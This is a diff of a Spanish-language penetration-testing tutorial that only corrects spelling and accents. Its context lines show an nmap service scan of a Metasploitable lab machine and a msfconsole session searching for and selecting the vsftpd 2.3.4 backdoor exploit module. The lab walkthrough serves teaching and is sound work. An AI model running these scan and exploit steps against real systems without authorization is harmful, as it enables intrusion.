@@ -2,7 +2,7 @@
 
 ## Explotando una vulnerabilidad
 
-Tengo instalada una máquina virtual de metasploitable y lo primero que quiero hacer es buscar que puertos abiertos tiene y que software hay en cada puerto. Para eso lo primero que haré es lanzar nmap:
+Tengo instalada una máquina virtual de metasploitable y lo primero que quiero hacer es buscar qué puertos abiertos tiene y qué software hay en cada puerto. Para eso lo primero que haré es lanzar nmap:
 
 ```sh
 nmap -sV 10.0.2.4
@@ -41,7 +41,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds
 ```
 
-Una vez que vemos que software hay abierto podemos buscar en msfconsole que exploits existen para intenar ganar acceso. Si busco por vsftpd veremos que hay un exploit que crea usa un backdoor y nos da acceso a la máquina:
+Una vez que vemos qué software hay abierto podemos buscar en msfconsole qué exploits existen para intentar ganar acceso. Si busco por vsftpd veremos que hay un exploit que crea una backdoor y nos da acceso a la máquina:
 
 ```sh
 msf6 > search vsftpd
@@ -62,7 +62,7 @@ msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
 [*] No payload configured, defaulting to cmd/unix/interact
 ```
 
-Podemos ver que parámetros usa el exploit y configurarlo ejecutando:
+Podemos ver qué parámetros usa el exploit y configurarlo ejecutando:
 
 ```sh
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > info
